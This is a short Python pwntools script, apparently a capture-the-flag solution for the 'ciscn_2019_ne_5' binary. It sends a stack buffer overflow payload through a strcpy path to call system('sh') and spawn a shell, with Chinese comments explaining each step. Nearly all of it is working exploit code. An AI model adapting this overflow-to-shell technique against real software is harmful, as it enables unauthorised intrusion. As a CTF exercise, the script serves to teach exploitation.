# coding=utf-8

from pwn import *

context.os = 'linux'
context.arch = 'i386'
context.log_level = 'debug'

p = process('./ciscn_2019_ne_5')
elf = ELF('./ciscn_2019_ne_5')

padding = 'a' * 0x48
fake_ebp = 'jkjk'
fake_callee_ebp = 'kjkj'

system_addr = 0x080484D0
sh_addr = 0x080482ea    # 通过ROPgadget来获取匹配sh的字符串
                        # 在ELF格式的文件中，存在函数名数据表，用于存放函数名称对应的字符串

payload = padding + fake_ebp
payload += p32(system_addr) + fake_callee_ebp + p32(sh_addr)

#############pwn##############
p.sendlineafter('password:', 'administrator')
p.sendlineafter(':', '1')   # 写入payload
p.sendlineafter('info:', payload)
p.sendlineafter(':', '4')   # 调用strcpy函数，利用溢出漏洞来执行system('sh')
p.interactive()
